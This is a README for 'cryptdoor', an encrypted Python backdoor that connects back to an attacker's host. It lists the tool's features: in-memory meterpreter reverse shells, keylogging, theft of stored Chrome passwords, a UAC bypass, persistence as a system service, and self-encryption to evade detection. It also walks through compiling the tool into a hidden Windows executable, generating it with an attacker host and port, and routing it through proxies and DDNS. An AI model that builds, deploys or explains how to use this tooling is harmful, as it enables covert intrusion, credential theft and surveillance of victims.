cryptdoor
=========

AES encrypted python backdoor that communicates only AES encrypted traffic.
Shell has the ability to spawn a meterpreter reverse_tcp into memory using VirtualAlloc (taken from Veil-Evasion).
We can also download and upload files over the secure AES encrypted connection.
Keylogging is implemented for windows using pyHook.
All traffic apart from traffic meterpreter makes are encrypted with AES.
On top of this all of the imports are randomized, and the script is encrypted with AES and decrypts 
itself in memory at runtime (taken from pyherion).

Compilation
=========

The backdoor script can be compiled to a standalone PE executable using pyinstaller on windows.

1. Install python27: https://www.python.org/ftp/python/2.7.8/python-2.7.8.msi
2. Run this script to install pip: https://bootstrap.pypa.io/get-pip.py
3. Press Windows Key+Pause, then "Advanced system settings" then "Environment Variables"
4. You might or not have a "PATH" variable listed there if not add one and write

	"C:\Python27;C:\Python27\Scripts"

If you do already have one just add a colon before adding this to the variable like:

	"C:\oldpath;C:\Python27;C\Python27\Scripts"

5. Open a new cmd terminal and you should be able to:

	pip install pyinstaller pycrypto

6. Add ';C:\Python27\Lib\site-packages\PyInstaller' to the end of your PATH variable
7. Install pyHook: http://sourceforge.net/projects/pyhook/files/latest/download
8. Install pywin32: http://sourceforge.net/projects/pywin32/files/pywin32/
9. Place the socks.py file in the same directory as backdoor.py if you want to use a proxy.
10. Open a new cmd promt and cd to wherever backdoor.py is.

	pyinstaller -F -w backdoor.py

11. That's it, enjoy your exe in dist.

Usage
=========

	usage: ./cryptdoor.py [options]

	optional arguments:
	  -h, --help            show this help message and exit
	  -i HOSTNAME, --hostname HOSTNAME
	                        Ip or hostname to connect back to.
	  -p PORT, --port PORT  Port.
	  -a, --persistence     Enable Auto-persistence.
	  -x, --proxy           Enable HTTP proxy connect.
	  -b BACKDOORNAME, --backdoorname BACKDOORNAME
	                        Name of backdoor (default backdoor.py).
	  -s SERVERNAME, --servername SERVERNAME
 	                       Name of server (default server.py).


cryptdoor.py will make the backdoor and server.
The syntax is:

	./cryptdoor.py -i host -p port

You can add a -a to attempt automatic persistence like:

	./cryptdoor.py -i host -p port -a

host and port refer to the host and port of the listening server (attacker).
These are the options you have from withing the shell:

	AES-shell options:
    	 download file       -  Download a file from remote pwd to localhost.
    	 upload filepath     -  Upload a filepath to remote pwd.
    	 run commands        -  Run a command in the background.
         wget url            -  Download a file from url to remote pwd.

	Windows Only:
    	 persistence         -  Install exe as a system service backdoor.
    	 meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.
    	 keyscan             -  Start recording keystrokes.
    	 keydump             -  Dump recorded keystrokes.
    	 keyclear            -  Clear the keystroke buffer.
    	 chromepass          -  Retrieve chrome stored passwords.
    	 bypassuac cmds      -  Run commands as admin.

Proxies
=========

If you wish to have your backdoor connect back to you through a HTTP/s proxy, there a few things we have to do:

1. Edit the cryptdoor script from line 267-268, and fill in the values for the proxy details.

2. Get a DDNS pointed at your IP (proxying does not work without one.)

3. Then generate your backdoor with the -x switch and replace the IP with your DDNS hostname:

	./cryptdoor.py -i DDNS -p port -x



